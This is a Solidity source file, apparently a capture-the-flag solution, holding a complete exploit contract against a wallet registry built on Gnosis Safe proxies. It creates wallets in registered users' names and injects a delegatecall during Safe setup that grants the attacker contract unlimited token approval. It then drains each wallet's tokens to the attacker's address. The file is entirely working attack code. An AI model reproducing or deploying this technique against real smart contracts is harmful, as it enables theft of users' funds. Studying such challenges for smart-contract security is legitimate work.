// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract ApproveContract {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract Exploit_Backdoor {
    WalletRegistry immutable walletRegistry;
    GnosisSafeProxyFactory immutable factory;
    GnosisSafe immutable masterCopy;
    IERC20 immutable token;
    ApproveContract immutable approveCode;
    address immutable attackerEOA;

    address[] public users;

    constructor(WalletRegistry _walletRegistiry, address[] memory _users) {
        walletRegistry = _walletRegistiry;
        factory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        token = walletRegistry.token();
        approveCode = new ApproveContract();
        attackerEOA = msg.sender;
        users = _users;

        exploit();
    }

    function exploit() public {
        address wallet;
        bytes memory setupData;
        address[] memory owner = new address[](1);

        for (uint256 i = 0; i < 4; i++) {
            owner[0] = users[i];
            //setup gnosis safe wallet
            setupData = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owner,
                1,
                address(approveCode),
                //here is the call we inserted that will be made during wallet creation
                //it will grant this contract unlimited token approvals
                abi.encodeWithSelector(
                    approveCode.approve.selector,
                    address(this),
                    token
                ),
                address(0),
                address(token),
                0,
                payable(attackerEOA)
            );

            //create the wallet behalf of the users
            wallet = address(
                factory.createProxyWithCallback(
                    address(masterCopy),
                    setupData,
                    0,
                    walletRegistry
                )
            );

            token.transferFrom(wallet, attackerEOA, token.balanceOf(wallet));
        }
    }
}
